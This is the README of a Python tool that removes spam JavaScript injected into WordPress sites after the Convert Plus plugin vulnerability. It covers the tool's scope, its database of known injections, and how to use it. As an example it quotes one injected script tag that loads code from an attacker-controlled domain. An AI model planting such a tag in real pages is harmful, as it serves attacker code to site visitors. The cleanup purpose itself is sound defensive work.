# Wordpress Spam Attack Removal Script

Written in Python and compatible with both **Python2** and **Python3**.

This script essentially removes spam attack injections from a given path. The convertplug plugin that comes with Avada which has a  vulnurability disclosed by Wordfence have caused numerous sites to be breached, unauthorized users have access to content,code and database. This script should be only utilized to clean injected javascript snippets from the themes and any other place where it might be. 

You can read the details about vulnerability from here

<https://www.wordfence.com/blog/2019/05/critical-vulnerability-patched-in-popular-convert-plus-plugin/>

## Considirations

This script utilizes **RAM** while reading files and does not **discriminate** file extensions and checks all files. This can be improved by various methods.

__PS : This script does replaces text that is inside the "database.json" does not locates or scans shells.__

### Scope

There are 4 specific JS injections that has occured after this vulnurability and the database.json contains only those records. In case you want to add further javascript/to be replaced you can use insert.py.

#### Example Injected Script

```html
<script type='text/javascript' async src='https://css.developmyredflag.top/sjquery.min.js?style=prime&'></script>
```

Various kinds of scripts exists like these and this tool/script automizes the removal process without breaking themes, plugins and sites as a whole. 

## Example Usage

Script is written for Python 2.7+. Logs the altered files to show which files were affected.

Install the dependencies and devDependencies and start the server.

### Example Insert Operation

```sh
python insert.py "string_in_double_quotes"
```

### Example Cleanup Operation

```sh
python cleanup.py your_domain.com
```

or entering a full path like

```sh
python cleanup.py /home/user/your_domain.com
```

### License

License can be found under LICENSE in this repository.
